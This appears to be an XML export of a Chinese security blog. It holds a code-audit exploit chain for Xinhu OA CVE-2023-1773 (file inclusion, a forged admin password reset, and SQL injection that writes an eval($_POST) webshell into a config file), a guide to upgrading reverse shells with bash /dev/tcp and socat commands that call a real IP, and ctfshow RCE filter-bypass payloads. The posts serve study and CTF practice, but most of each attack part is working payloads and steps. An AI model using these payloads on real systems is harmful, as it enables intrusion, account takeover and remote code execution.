elseif($mod == &quot;upload&quot;)&#123;       $type = daddslashes($_REQUEST[&#x27;type&#x27;]);       if($type == 1)&#123;           if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)) &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 5242880))&#123;               if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;                   $result=array(&quot;code&quot;=&gt;-2,&quot;msg&quot;=&gt;&quot;上传出错！&quot;);                   exit(json_encode($result));               &#125;else&#123;                   $cmm = date(&quot;YmdHis&quot;).rand(111,999);                   $name = explode(&#x27;.&#x27;,$_FILES[&quot;file&quot;][&quot;name&quot;]);                   $newPath = $cmm.&#x27;.&#x27;.$name[1];                   if (preg_match(&quot;/[\x7f-\xff]/&quot;, $newPath)) &#123;                       $result=array(&quot;code&quot;=&gt;-3,&quot;msg&quot;=&gt;&quot;文件名称不能为中文！&quot;);                       exit(json_encode($result));                   &#125;                   if (file_exists(&quot;../upload/&quot; . $newPath))&#123;                       $result=array(&quot;code&quot;=&gt;-2,&quot;msg&quot;=&gt;&quot;上传出错！&quot;);                       exit(json_encode($result));                   &#125;else&#123;                       move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;../upload/&quot; . $newPath);                       $lj=array(&quot;src&quot;=&gt;&quot;/upload/&#123;$newPath&#125;&quot;,&quot;title&quot;=&gt;&quot;图片&quot;);                       $result=array(&quot;code&quot;=&gt;0,&quot;msg&quot;=&gt;&quot;上传成功！&quot;,&quot;data&quot;=&gt;$lj,&quot;name&quot;=&gt;&quot;/upload/&#123;$newPath&#125;&quot;);                       exit(json_encode($result));                   &#125;               &#125;           &#125;else&#123;               $result=array(&quot;code&quot;=&gt;-3,&quot;msg&quot;=&gt;&quot;图片大小不能超过5M！&#123;$_FILES[&quot;file&quot;][&quot;size&quot;]&#125;&quot;);               exit(json_encode($result));           &#125;       &#125;       else&#123;           $result=array(&quot;code&quot;=&gt;-1,&quot;msg&quot;=&gt;&quot;上传类型不存在！&quot;);       &#125;       exit(json_encode($result));   &#125;

其中$mod由$mod = isset($_REQUEST[&#39;mod&#39;]) ? $_REQUEST[&#39;mod&#39;] :0;控制
上述代码对文件上传的验证是检测其上传的mime类型是否是图片的，不检查文件名后缀
因此我们便可以便可以伪造mime类型上传任意文件了
伪造请求体如下：

访问该文件

]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
  </entry>
  <entry>
    <title>代码审计：CVE-2023-1773</title>
    <url>/2024/07/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ACVE-2023-1773/</url>
    <content><![CDATA[产品：信呼oa
影响版本：&lt;&#x3D;2.32
开源地址：https://github.com/rainrocka/xinhu/commits/master/
首先我们先起好docker镜像，默认登录账号名为admin，密码为123456
开始代码审计最最开始的时候，我们当然要看index.php的代码（代码块中的大部分注释为我自己写入进去的理解）如下：
&lt;?php include_once(&#x27;config/config.php&#x27;);$_uurl 		= $rock-&gt;get(&#x27;rewriteurl&#x27;);$d 			= &#x27;&#x27;;$m 			= &#x27;index&#x27;;$a 			= &#x27;default&#x27;;if($_uurl != &#x27;&#x27;)&#123;	unset($_GET[&#x27;m&#x27;]);unset($_GET[&#x27;d&#x27;]);unset($_GET[&#x27;a&#x27;]);//释放变量m,d,a	$m		= $_uurl;	$_uurla = explode(&#x27;_&#x27;, $_uurl);//以_来分割变量$_uurl为数组$_uurla	if(isset($_uurla[1]))&#123;$d = $_uurla[0];$m = $_uurla[1];&#125;	if(isset($_uurla[2]))&#123;$d = $_uurla[0];$m = $_uurla[1];$a = $_uurla[2];&#125;	$_uurla = explode(&#x27;?&#x27;,$_SERVER[&#x27;REQUEST_URI&#x27;]);//以?分割成URI的路径部分和查询字符串部分并赋给数组$_uurla	if(isset($_uurla[1]))&#123;		$_uurla = explode(&#x27;&amp;&#x27;, $_uurla[1]);//查询字符串部分用&amp;来分割，比如是&#x27;foo=bar&amp;baz=qux&#x27;被分割        foreach($_uurla as $_uurlas)&#123;//每个元素都是一个键值对			$_uurlasa = explode(&#x27;=&#x27;, $_uurlas);//用=分割成键和值两部分			if(isset($_uurlasa[1]))$_GET[$_uurlasa[0]]=$_uurlasa[1];            //如果有值，键是$_uurlasa[0]，值是$_uurlasa[1].比如$_GET[&#x27;foo&#x27;] = &#x27;bar&#x27;		&#125;	&#125;//遍历&#125;else&#123;	$m			= $rock-&gt;jm-&gt;gettoken(&#x27;m&#x27;, &#x27;index&#x27;);	$d			= $rock-&gt;jm-&gt;gettoken(&#x27;d&#x27;);	$a			= $rock-&gt;jm-&gt;gettoken(&#x27;a&#x27;, &#x27;default&#x27;);&#125;$ajaxbool	= $rock-&gt;jm-&gt;gettoken(&#x27;ajaxbool&#x27;, &#x27;false&#x27;);$mode		= $rock-&gt;get(&#x27;m&#x27;, $m);if(!$config[&#x27;install&#x27;] &amp;&amp; $mode != &#x27;install&#x27;)$rock-&gt;location(&#x27;?m=install&#x27;);include_once(&#x27;include/View.php&#x27;);

$_SERVER[&#39;REQUEST_URI&#39;]:

$_SERVER 是一个超全局变量，它包含了关于服务器环境和请求的信息。
&#39;REQUEST_URI&#39; 是 $_SERVER 数组中的一个键，它包含了当前请求的URI。例如，如果用户访问的是 http://example.com/path/to/page?foo=bar，那么 $_SERVER[&#39;REQUEST_URI&#39;] 的值就是 /path/to/page?foo=bar。

看完该份文件后我们需要注意三个变量：$m,$d,$a，以及该行代码$_uurl = $rock-&gt;get(&#39;rewriteurl&#39;);，思考其中的get()方法是什么，让我们溯源下去，该方法相关代码如下：
public function get($name,$dev=&#x27;&#x27;, $lx=0)	&#123;		$val=$dev;		if(isset($_GET[$name]))$val=$_GET[$name];		if($this-&gt;isempt($val))$val=$dev;    	//isempt函数：如果传入字符为空并且不是数字，则返回true		return $this-&gt;jmuncode($val, $lx, $name);    	//对特殊字符进行编码，空格消去，预防xss		&#125;

通过该方法获取GET传参中的值，并对xss进行了一定程度的预防
在index.php中末尾部分代码还包含了文件View.php，代码如下：
&lt;?phpif(!isset($ajaxbool))$ajaxbool = $rock-&gt;jm-&gt;gettoken(&#x27;ajaxbool&#x27;, &#x27;false&#x27;);$ajaxbool	= $rock-&gt;get(&#x27;ajaxbool&#x27;, $ajaxbool);$p			= PROJECT;if(!isset($m))$m=&#x27;index&#x27;;if(!isset($a))$a=&#x27;default&#x27;;if(!isset($d))$d=&#x27;&#x27;;$m			= $rock-&gt;get(&#x27;m&#x27;, $m);$a			= $rock-&gt;get(&#x27;a&#x27;, $a);$d			= $rock-&gt;get(&#x27;d&#x27;, $d);define(&#x27;M&#x27;, $m);//将$m的值赋给常量Mdefine(&#x27;A&#x27;, $a);define(&#x27;D&#x27;, $d);define(&#x27;P&#x27;, $p);$_m			= $m;if($rock-&gt;contain($m, &#x27;|&#x27;))//如果$m包含&#x27;|&#x27;且不在开头，返回true&#123;	$_mas 	= explode(&#x27;|&#x27;, $m);//通过|分割成两部分	$m 		= $_mas[0];	$_m		= $_mas[1];&#125;include_once($rock-&gt;strformat(&#x27;?0/?1/?1Action.php&#x27;,ROOT_PATH, $p));//经过strformat函数后变为了ROOT_PATH/&quot;.$p.&quot;/&quot;.$p.&quot;Action.php$rand		= date(&#x27;YmdHis&#x27;).rand(1000,9999);//当天的日期时间和随机数拼接在一起if(substr($d,-1)!=&#x27;/&#x27; &amp;&amp; $d!=&#x27;&#x27;)$d.=&#x27;/&#x27;;//$d的最后一个字符不是斜杠并且字符串不为空，则将/添加到$d的末尾$errormsg	= &#x27;&#x27;;$methodbool	= true;$actpath	= $rock-&gt;strformat(&#x27;?0/?1/?2?3&#x27;,ROOT_PATH, $p, $d, $_m);//ROOT_PATH/&quot;.$p.&quot;/&quot;.$d.&quot;&quot;.$_mdefine(&#x27;ACTPATH&#x27;, $actpath);$actfile	= $rock-&gt;strformat(&#x27;?0/?1Action.php&#x27;,$actpath, $m);//$actpath/&quot;.$m.&quot;Action.php$actfile1	= $rock-&gt;strformat(&#x27;?0/?1Action.php&#x27;,$actpath, $_m);//$actpath/&quot;.$_m.&quot;Action.php$actbstr 	= null;if(file_exists($actfile1))include_once($actfile1);if(file_exists($actfile))&#123;	include_once($actfile);//包含的文件可控	$clsname	= &#x27;&#x27;.$m.&#x27;ClassAction&#x27;;	$xhrock		= new $clsname();	$actname	= &#x27;&#x27;.$a.&#x27;Action&#x27;;	if($ajaxbool == &#x27;true&#x27;)$actname	= &#x27;&#x27;.$a.&#x27;Ajax&#x27;;	if(method_exists($xhrock, $actname))//$xhrock类中是否存在$actname方法，存在为true    &#123;		$xhrock-&gt;beforeAction();		$actbstr = $xhrock-&gt;$actname();//直接调用该方法		$xhrock-&gt;bodyMessage = $actbstr;		if(is_string($actbstr))&#123;echo $actbstr;$xhrock-&gt;display=false;&#125;//结果是否为字符串，打印结果		if(is_array($actbstr))&#123;echo json_encode($actbstr);$xhrock-&gt;display=false;&#125;//结果是否为数组，打印结果	&#125;else&#123;		$methodbool = false;		if($ajaxbool == &#x27;false&#x27;)echo &#x27;&#x27;.$actname.&#x27; not found;&#x27;;	&#125;	$xhrock-&gt;afterAction();&#125;else&#123;	echo &#x27;actionfile not exists;&#x27;;	$xhrock		= new Action();&#125;$_showbool = false;if($xhrock-&gt;display &amp;&amp; ($ajaxbool == &#x27;html&#x27; || $ajaxbool == &#x27;false&#x27;))//条件满足，执行模板渲染&#123;	$xhrock-&gt;smartydata[&#x27;p&#x27;]	= $p;	$xhrock-&gt;smartydata[&#x27;a&#x27;]	= $a;	$xhrock-&gt;smartydata[&#x27;m&#x27;]	= $m;	$xhrock-&gt;smartydata[&#x27;d&#x27;]	= $d;	$xhrock-&gt;smartydata[&#x27;rand&#x27;]	= $rand;	$xhrock-&gt;smartydata[&#x27;qom&#x27;]	= QOM;	$xhrock-&gt;smartydata[&#x27;path&#x27;]	= PATH;	$xhrock-&gt;smartydata[&#x27;sysurl&#x27;]= SYSURL;	$temppath					= &#x27;&#x27;.ROOT_PATH.&#x27;/&#x27;.$p.&#x27;/&#x27;;	$tplpaths					= &#x27;&#x27;.$temppath.&#x27;&#x27;.$d.&#x27;&#x27;.$m.&#x27;/&#x27;;	$tplname					= &#x27;tpl_&#x27;.$m.&#x27;&#x27;;	if($a!=&#x27;default&#x27;)$tplname  .= &#x27;_&#x27;.$a.&#x27;&#x27;;	$tplname				   .= &#x27;.&#x27;.$xhrock-&gt;tpldom.&#x27;&#x27;;	$mpathname					= $tplpaths.$tplname;	if($xhrock-&gt;displayfile!=&#x27;&#x27; &amp;&amp; file_exists($xhrock-&gt;displayfile))$mpathname = $xhrock-&gt;displayfile;	if(!file_exists($mpathname) || !$methodbool)&#123;		if(!$methodbool)&#123;			$errormsg	= &#x27;in (&#x27;.$m.&#x27;) not found Method(&#x27;.$a.&#x27;);&#x27;;		&#125;else&#123;			$errormsg	= &#x27;&#x27;.$tplname.&#x27; not exists;&#x27;;		&#125;		echo $errormsg;	&#125;else&#123;		$_showbool = true;	&#125;&#125;if($xhrock-&gt;display &amp;&amp; ($ajaxbool == &#x27;html&#x27; || $xhrock-&gt;tpltype==&#x27;html&#x27; || $ajaxbool == &#x27;false&#x27;) &amp;&amp; $_showbool)&#123;	$xhrock-&gt;setHtmlData();	$da = $xhrock-&gt;smartydata;	foreach($xhrock-&gt;assigndata as $_k=&gt;$_v)$$_k=$_v;	include_once($mpathname);	$_showbool = false;&#125;

对于ROOT_PATH的分析：
define(&#x27;ROOT_PATH&#x27;,str_replace(&#x27;\\&#x27;,&#x27;/&#x27;,dirname(dirname(__FILE__))));	//系统根目录路径

该常量会默认为是系统的根目录
对于PROJECT的分析：
if(!defined(&#x27;PROJECT&#x27;))define(&#x27;PROJECT&#x27;, $rock-&gt;get(&#x27;p&#x27;, &#x27;webmain&#x27;));

上述代码说明了要是变量p没有值那么会默认为webmain，常量PROJECT的值便为webmain目录
文件\include\Action.php中public $smartydata = array();  //模版数据说明了$smartydata为模板数据数组（用不到）
下面为两个比较重要的方法
public function strformat($str)&#123;    $len = func_num_args();//func_num_args()得到传入该函数的参数数量并传给$len    $arr = array();    for($i=1; $i&lt;$len; $i++)$arr[] = func_get_arg($i);//从第二个参数开始添加到数组$arr的末尾    //为什么从i=1开始？因为格式化字符串函数传入的第一个参数是含占位符的待格式化字符串    $s  = $this-&gt;stringformat($str, $arr);    return $s;&#125;............public function stringformat($str, $arr=array())&#123;    $s	= $str;    for($i=0; $i&lt;count($arr); $i++)&#123;        $s=str_replace(&#x27;?&#x27;.$i.&#x27;&#x27;, $arr[$i], $s);        //占位符为&#x27;?&#x27;加上一个数字代表用后面第几个参数来填充该位置    &#125;    return $s;&#125;

通过对$m,$a,$d三个变量值的控制，我们可以实现包含我们自己想要包含的任意文件，并调用我们自己需要的方法，比如
这里有个一路径中的变量$actpath，被两个下文被包含住的变量$actfile以及$actfile1给拼接，弄明白是如何构造的：
用ROOT_PATH，$p，$d，$_m分别填充前面的一个格式化路径
$_m我们可以控制GET传入m参数时’|’字符两边的字符串来控制，$p和ROOT_PATH，$d在上面存在一个简单的处理，如果不是以’&#x2F;‘结尾就给他加上’&#x2F;‘
总结起来，假设我们的根目录是&#x2F;var&#x2F;www&#x2F;html&#x2F;，传入p&#x3D;webmain&amp;d&#x3D;task&amp;m&#x3D;file|api
那么$actpath就是”&#x2F;var&#x2F;www&#x2F;html&#x2F;webmain&#x2F;task&#x2F;api”
紧接着下面的$actfile就是”&#x2F;var&#x2F;www&#x2F;html&#x2F;webmain&#x2F;task&#x2F;api&#x2F;fileAction.php”
其实actfile1我们并不能做到真正完全的可控，因为其最后的拼接是$_m.$_m，就意味着最后包含的php文件的前缀名必须与上级目录相同，具有一定的局限性，这里我们侧重观察actfile被包含后的操作(实际上actfile1被包含后也确实并没有进行更多的操作了)，接下来的分析围绕着actfile，$classname变量由$a和”ClassAction”拼接起来，$a可控。，$actname变量由$a和”Action”拼接起来，$a可控。如果ajaxbool为true那么$actname由$a和”Ajax”拼接，$ajaxbool可控(前文提到控制GET传参)。然后new一个名为$classname的值的类，判断该对象中是否存在名为$actname的方法，如果存在，就执行并把结果echo出来
寻找漏洞修改密码接下来我们的工作就是要找到一个可以利用的类中的方法，这个时候我们注意到了\webmain\task\api\reimplatAction.php，如下：
&lt;?php class reimplatClassAction extends apiAction&#123;	public function initAction()	&#123;		$this-&gt;display= false;	&#125;		//平台上通知过来的数据	public function indexAction()	&#123;		$body = $this-&gt;getpostdata();//下面篇幅中有关于该方法的具体代码，无任何过滤		if(!$body)return;		$db 	 = m(&#x27;reimplat:dept&#x27;);		$key 	 = $db-&gt;gethkey();//密钥，不需要关注		$bodystr = $this-&gt;jm-&gt;strunlook($body, $key);		if(!$bodystr)return;			$data 	 = json_decode($bodystr, true);		$msgtype = arrvalue($data,&#x27;msgtype&#x27;);		$msgevent= arrvalue($data,&#x27;msgevent&#x27;);				//用户状态改变停用		if($msgtype==&#x27;subscribe&#x27;)&#123;			$user 	= arrvalue($data, &#x27;user&#x27;);			$zt 	= &#x27;0&#x27;;			if($msgevent==&#x27;yes&#x27;)$zt = &#x27;1&#x27;;			if($msgevent==&#x27;stop&#x27;)$zt = &#x27;2&#x27;;			$db-&gt;update(&#x27;`status`=&#x27;.$zt.&#x27;&#x27;,&quot;`user`=&#x27;$user&#x27;&quot;);		&#125;				//修改手机号		if($msgtype==&#x27;editmobile&#x27;)&#123;			$user 	= arrvalue($data, &#x27;user&#x27;);			$mobile = arrvalue($data, &#x27;mobile&#x27;);			$where  = &quot;`user`=&#x27;$user&#x27;&quot;;			$upstr  = &quot;`mobile`=&#x27;$mobile&#x27;&quot;;			$db-&gt;update($upstr, $where);			$dbs	= m(&#x27;admin&#x27;);			$dbs-&gt;update($upstr,$where);			$uid 	= $dbs-&gt;getmou(&#x27;id&#x27;,$where);			m(&#x27;userinfo&#x27;)-&gt;update($upstr,&quot;`id`=&#x27;$uid&#x27;&quot;);		&#125;				//修改密码		if($msgtype==&#x27;editpass&#x27;)&#123;			$user = arrvalue($data, &#x27;user&#x27;);			$pass = arrvalue($data, &#x27;pass&#x27;);			if($pass &amp;&amp; $user)&#123;				$where  = &quot;`user`=&#x27;$user&#x27;&quot;;				$mima 	= md5($pass);				m(&#x27;admin&#x27;)-&gt;update(&quot;`pass`=&#x27;$mima&#x27;,`editpass`=`editpass`+1&quot;, $where);			&#125;		&#125;//感觉可以操作一下	&#125;&#125;

上述代码中的getpostdata函数：
public function getpostdata()	&#123;		$postdata = &#x27;&#x27;;		if(isset($GLOBALS[&#x27;HTTP_RAW_POST_DATA&#x27;]))$postdata = $GLOBALS[&#x27;HTTP_RAW_POST_DATA&#x27;];		if($postdata==&#x27;&#x27;)$postdata = trim(file_get_contents(&#x27;php://input&#x27;));    	//trim方法去除字符串首尾处的空白字符		return $postdata;	&#125;

发现很有用的地方，该函数没有任何过滤，并且通过php://input伪协议来获取POST进去的数据，可以利用一下
对于strunlook()方法，我们溯源后发现是一个字符串解密的函数，位于&#x2F;include&#x2F;chajian&#x2F;jmChajian.php文件中，溯源过程如下：
$bodystr = $this-&gt;jm-&gt;strunlook($body, $key);//溯源this-&gt;jm$this-&gt;jm		= c(&#x27;jm&#x27;, true);//Action.php//继续溯源c方法function c($name, $inbo=true, $param1=&#x27;&#x27;, $param2=&#x27;&#x27;)&#123;	$class	= &#x27;&#x27;.$name.&#x27;Chajian&#x27;;	$path	= &#x27;&#x27;.ROOT_PATH.&#x27;/include/chajian/&#x27;.$class.&#x27;.php&#x27;;	$cls	= NULL;	if(file_exists($path))&#123;		include_once($path);		if($inbo)$cls	= new $class($param1, $param2);	&#125;	return $cls;	&#125;//位于rockFun.php//该方法会包含文件$nameChajian.php，这里我们要溯源到jmChajian.php，找到了strunlook方法（对数据简单解密）

在reimplatAction.php中，我们可以利用indexAction()方法，通过它来修改账户的密码
所以现在的思路：传入加密后的json数据，让后台进行自动解密，通过输入相应的键值对来修改密码
因此json数据中我们需要的键值对如下：
&#123;&quot;msgtype&quot;:&quot;editpass&quot;,&quot;user&quot;:&quot;admin&quot;,&quot;pass&quot;:&quot;admin&quot;&#125;

首先我们在本地测试的时候需要在reimplatAction.php文件中的添加相关代码，从而获取到加密后的json数据，如下：

利用bp抓包，然后进行操作：get传参?p=webmain&amp;d=task&amp;m=reimplat|api&amp;a=index，接着再加我们所需的json代码，如下：

得到加密后的json内容，继续操作：
由于输入的是加密后的json内容，后台会自动解码配对修改账户密码，这样子我们就成功修改了admin的密码
退出账号，输入修改后的密码，成功登录
实现rce但是这样子的话我们仅仅能做到的也就是修改修改账户的密码，不应满足于此，继续查看代码
在&#x2F;webmain&#x2F;system&#x2F;cog&#x2F;cogAction.php下：
cogClassAction::savecongAjax()方法中有一处文件写入，只要可以控制$adminname就可以控制任意文件写入
对$adminname进行溯源，发现此字段会从数据库中取admin的name，所以我们只需要找到一个注入点，成功注入便可以利用

原本我们输入的$adminname会被注释掉，而我们需要摆脱被注释掉的命运，所以要在输入内容的开头来上一个/n进行换行，同时在末尾加上//使得后续不是我们输入的内容全被注释掉
实质上我们输入的为字符串，并且该字符串会写入一个文件中，成功写入回显ok
对$_confpath进行溯源，具体代码为$_confpath = $this-&gt;rock-&gt;strformat(&#39;?0/?1/?1Config.php&#39;, ROOT_PATH, PROJECT);
发现$thia-&gt;adminname其实就是写入配置文件webmainConfig.php中

然后我们对reimplatAction.php文件中的m方法进行溯源，具体代码如下：
function m($name)&#123;    $cls      = NULL;    $pats     = $nac = &#x27;&#x27;;    $nas      = $name;    $asq      = explode(&#x27;:&#x27;, $nas);    if(count($asq)&gt;1)&#123;       $nas   = $asq[1];       $nac   = $asq[0];       $pats  = $nac.&#x27;/&#x27;;       $_pats = &#x27;&#x27;.ROOT_PATH.&#x27;/&#x27;.PROJECT.&#x27;/model/&#x27;.$nac.&#x27;/&#x27;.$nac.&#x27;.php&#x27;;       if(file_exists($_pats))&#123;          include_once($_pats);          $class = &#x27;&#x27;.$nac.&#x27;Model&#x27;;          $cls   = new $class($nas);       &#125;      &#125;    $class    = &#x27;&#x27;.$nas.&#x27;ClassModel&#x27;;    $path     = &#x27;&#x27;.ROOT_PATH.&#x27;/&#x27;.PROJECT.&#x27;/model/&#x27;.$pats.&#x27;&#x27;.$nas.&#x27;Model.php&#x27;;    if(file_exists($path))&#123;       include_once($path);       if($nac!=&#x27;&#x27;)$class= $nac.&#x27;_&#x27;.$class;       $cls   = new $class($nas);    &#125;    if($cls==NULL)$cls = new sModel($nas);    return $cls;&#125;

可以得到该方法是把&#x2F;webmain&#x2F;model&#x2F;下的php文件包含起来了
m方法的参数是$name，实际上我们操作的表名是xinhu_$name
综上，我选择的是reimplatAction.php文件中的修改mobile处，从那里下手进行sql注入，这样子我们就需要溯源到底层的update()方法，明白其具体的sql语句，从而进行绕过
最底层的update方法如下所示：
public function update($table,$content,$where)	&#123;		$where = $this-&gt;getwhere($where);		$sql=&quot;update `$table` set $content where $where &quot;;		return $this-&gt;tranbegin($sql);	&#125;	

在文件中的已经指定了$table的内容，即admin和其他两个表，$where的内容为=&quot;user=&#39;$user&#39;&quot;，$content在具体代码中即$upstr,即= &quot;mobile=&#39;$mobile&#39;&quot;;，因此我们传入的json数据需为以下格式：
&#123;&quot;msgtype&quot;:&quot;editmobile&quot;,&quot;user&quot;:&quot;&quot;,&quot;mobile&quot;:&quot;&quot;&#125;

在sql文件中看到xinhu_admin表中的mobile字段处是输入字符串，因此我们需要逃出单引号包裹
并且我们要改的字段名为name，也是需要输入字符串的
最终我们需要传入的json数据如下：
&#123;&quot;msgtype&quot;:&quot;editmobile&quot;,&quot;user&quot;:&quot;admin&quot;,&quot;mobile&quot;:&quot;123&#x27;,name=&#x27;\nphpinfo();//&quot;&#125;


然后再把加密后的json文件再传一遍，查看xinhu_admin表，可以看见admin的name已经发生了改变

接着我们查看配置文件，发现并没有任何修改，这是为什么
这是因为我们还没有调用$adminname所属的savecongAjax()方法，变量还没有被写入配置文件中
所以我们在重新登陆后需要包含的内容如下：
?p=webmain&amp;d=system&amp;m=cog|cog&amp;ajaxbool=true&amp;a=savecong

成功包含

再刷新一遍页面，如下：

成功实现了phpinfo()，这也说明了我们可以实现rce了，但是要注意name字段有长度限制，所以一句话木马不能够太长
接着实现rce，更改json文件如下：
&#123;&quot;msgtype&quot;:&quot;editmobile&quot;,&quot;user&quot;:&quot;admin&quot;,&quot;mobile&quot;:&quot;123&#x27;,name=&#x27;\neval($_POST[1]);//&quot;&#125;

剩下的操作和上面实现phpinfo()的操作一模一样，然后我们尝试用蚁剑连接


成功连接上，实现rce
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
  </entry>
  <entry>
    <title>反弹shell升级为完全交互式shell</title>
    <url>/2025/08/15/%E5%8F%8D%E5%BC%B9shell%E5%8D%87%E7%BA%A7%E4%B8%BA%E5%AE%8C%E5%85%A8%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/</url>
    <content><![CDATA[前言当Webshell反弹到服务器上时经常都是非交互式的，具体表现为控制符变成了转义序列。在某些时候就很难下一步操作了，比如需要使用vim时显示一堆的控制符，在Ctrl+C时却退出了Shell
反弹 shell 一般是非交互式的，主要原因和反弹 shell 的工作方式、网络环境以及终端类型有关。


终端类型问题


反弹 shell 通常是通过 bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/PORT 0&gt;&amp;1、nc、perl 等方式建立的 TCP 连接。
这种 TCP 连接并不是一个 TTY&#x2F;PTY（终端设备），而只是一个裸的网络数据流。
由于没有绑定到伪终端（pseudo-terminal），shell 无法识别终端的特性（例如光标移动、命令补全、vim、top 这些需要交互控制的程序），所以它表现为非交互式。



环境变量缺失


正常登录的交互式 shell 会设置一系列环境变量（如 TERM、SHELL、PS1 等），并执行 /etc/profile、~/.bashrc 这种初始化文件。
反弹 shell 启动时通常跳过这些初始化步骤，导致功能受限，看起来“傻傻的”。



权限和安全限制


目标机的某些安全配置（如 nohup、restricted shell）可能会让反弹 shell 运行在非交互模式，减少攻击者获取完整控制的可能性。
特别是在受限的 CTF 环境、容器、chroot 里，shell 默认就不给你分配 TTY。



TCP 连接本质


在你用反弹 shell 时，本质上是一个程序的标准输入输出直接绑到 TCP socket 上。
这跟你直接 ssh 或本地打开终端不同，没有额外的 终端控制通道，所以没有命令历史、光标控制等高级交互。

升级为完全式shellpython
前提是目标主机上面有python

1、查看监听服务器终端和STTY信息
root@i-wz982ibu6zo1y9jvywxi:~# echo $TERMxtermroot@i-wz982ibu6zo1y9jvywxi:~# stty -aspeed 38400 baud; rows 33; columns 124; line = 0;intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = &lt;undef&gt;; eol2 = &lt;undef&gt;; swtch = &lt;undef&gt;; start = ^Q;stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc

这里我们的终端信息为xterm，stty的行数(rows)为33，列数(columns)为124
2、在监听服务器开启监听
root@i-wz982ibu6zo1y9jvywxi:~# nc -lvvp 2333Listening on 0.0.0.0 2333

3、在目标机器执行反弹shell命令
bash -i &gt;&amp; /dev/tcp/47.113.102.46/2333 0&gt;&amp;1

4、启用python交互式
┌──(sherlock㉿LAPTOP-D6OB0LH7)-[~]└─$ python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;

5、按下Ctrl+Z，后台挂起
6、刷新终端
root@i-wz982ibu6zo1y9jvywxi:~# stty raw -echoroot@i-wz982ibu6zo1y9jvywxi:~# fg  #这个指令输入的时候不会回显┌──(sherlock㉿LAPTOP-D6OB0LH7)-[/tmp/frp_0.58.1_linux_amd64]└─$ reset

可能这时候就会有如下的提示询问终端类型，此时就可以直接输入终端信息然后回车
reset: unknown terminal type unknownTerminal type? 

若无提示需要设置
┌──(sherlock㉿LAPTOP-D6OB0LH7)-[/tmp/frp_0.58.1_linux_amd64]└─$ export TERM=xterm

根据自己的终端信息设置如下参数
$ export SHELL=bash$ stty rows 33 columns 124

socat
socat的可执行文件可以从https://github.com/3ndG4me/socat/releases下载

1、在监听服务器开启监听
$ socat file:`tty`,raw,echo=0 tcp-listen:7777

这里的7777为监听的端口
2、把socat可执行文件上传到目标机器上
给socat执行文件赋权限：chmod 777 ./socatx64.bin
然后执行：
user@414e07ee65d84196:~$ ./socatx64.bin exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:47.113.102.46:7777

其中47.113.102.46:7777为监听服务器的IP和端口

]]></content>
      <categories>
        <category>渗透</category>
      </categories>
  </entry>
  <entry>
    <title>命令执行刷题</title>
    <url>/2024/03/30/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[q
前言在刷命令执行的题目之前，建议先仔细阅读一下这篇文章：CTF中常见RCE命令执行绕过技巧
ctfshow-web29&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;

首先 ?c=system(&#39;ls&#39;);查看当前目录下的文件，发现了flag.php
由于题目所限，可以使用通配符来绕过?c=system(%27cat%20./fla?.php);，右键查看源码得到flag
ctfshow-web30&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;

使用另一个可以执行外部命令的函数来代替system函数，但是要注意exec函数只能返回最后一行的数据，这边使用的passthru函数
?c=passthru(&#39;ls&#39;);：得到当前目录下的文件
?c=passthru(&#39;cat ./fla*&#39;);：邮件查看源码得到flag
ctfshow-web31&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;

从所提供的代码里面不难知道只检查变量c内的内容，所以我们可以再嵌套一个eval函数来绕过
?c=eval($_GET[cmd]);&amp;cmd=system(&#39;ls&#39;);：得到当前目录下的文件名
?c=eval($_GET[cmd]);&amp;cmd=system(&#39;cat flag.php&#39;);：右键查看源码得到flag
ctfshow-web32&amp;33&amp;34&amp;35&amp;36几道题之前的区别无非就是黑名单的内容，但是都可以用以下两种方式来绕过
&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;

来个非预期
